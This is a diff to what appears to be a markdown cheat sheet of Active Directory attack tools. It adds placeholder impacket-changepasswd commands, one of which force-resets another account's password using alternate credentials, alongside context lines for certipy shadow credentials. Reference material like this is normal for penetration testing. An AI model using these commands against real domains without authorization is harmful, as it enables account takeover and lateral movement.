@@ -166,6 +166,10 @@ certipy-ad shadow -account 'USERNAME' -dc-ip 'IP' -u 'USERNAME'@'DOMAIN' -p 'PAS
 ./godap 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD'
 ```
 - impacket-changepasswd
+```sh
+impacket-changepasswd -ts -newpass 'PASSWORD' 'DOMAIN'/'USERNAME':'PASSWORD'@'IP'
+impacket-changepasswd -ts -newpass 'PASSWORD_TARGET' -no-pass -altuser 'USERNAME' -altpass 'PASSWORD' -reset 'DOMAIN'/'USERNAME_TARGET'@'IP'
+```
 - impacket-findDelegation
 - impacket-GetADComputers
 - impacket-GetADUssers
